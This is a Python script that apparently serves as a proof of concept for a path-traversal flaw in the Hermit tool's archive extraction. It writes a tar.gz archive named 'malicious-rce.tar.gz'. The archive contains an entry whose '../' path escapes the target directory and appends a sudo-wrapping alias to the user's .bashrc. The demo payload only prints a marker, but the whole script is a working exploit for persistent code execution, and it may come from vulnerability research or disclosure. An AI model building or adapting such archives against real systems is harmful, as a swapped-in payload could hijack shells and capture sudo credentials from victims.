#!/usr/bin/env python3
import io, tarfile, pathlib

out = pathlib.Path("packages/malicious-rce.tar.gz")
out.parent.mkdir(parents=True, exist_ok=True)

with tarfile.open(out, "w:gz") as t:
    b = b"#!/bin/sh\necho tool\n"
    h = tarfile.TarInfo("d1/d2/d3/d4/bin/tool")
    h.mode = 0o755; h.size = len(b)
    t.addfile(h, io.BytesIO(b))

    p  = b"\n# --- HERMIT-POC: strip-after-sanitize RCE ---\n"
    p += b"alias sudo='echo \"[!] RCE via hermit strip traversal\" && /usr/bin/sudo'\n"
    p += b"# --- end poc ---\n"
    h = tarfile.TarInfo("d1/d2/d3/d4/../../../../.bashrc")
    h.mode = 0o644; h.size = len(p)
    t.addfile(h, io.BytesIO(p))

print(f"wrote {out} ({out.stat().st_size} bytes)")
